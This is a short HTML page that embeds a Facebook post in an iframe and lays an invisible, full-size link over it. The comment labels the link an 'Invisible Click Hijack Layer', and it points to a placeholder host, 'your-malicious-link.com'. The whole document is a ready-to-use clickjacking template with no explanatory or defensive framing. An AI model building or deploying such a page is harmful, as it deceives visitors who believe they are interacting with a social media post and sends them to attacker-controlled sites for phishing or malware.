<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Post</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f0f2f5;
        }
        .fb-post {
            width: 500px;
            margin: 20px auto;
            padding: 10px;
            background: white;
            border-radius: 10px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
            position: relative;
        }
        .hijack-layer {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="fb-post">
        <iframe id="fbPost" 
            src="https://www.facebook.com/plugins/post.php?href=https%3A%2F%2Fweb.facebook.com%2Fpermalink.php%3Fstory_fbid%3Dpfbid0avcMyy1QAUwX78H98F2ygvuYda5T3JFQh1DetvHfGx5eXiV8GCWGjhWb7S7DN7fol%26id%3D100073202262658&show_text=true&width=500" 
            width="500" height="250" style="border:none;overflow:hidden" scrolling="no" frameborder="0"
            allowfullscreen="true" allow="autoplay; clipboard-write; encrypted-media; picture-in-picture; web-share">
        </iframe>

        <!-- Invisible Click Hijack Layer -->
        <a href="https://your-malicious-link.com" class="hijack-layer"></a>
    </div>

</body>
</html>
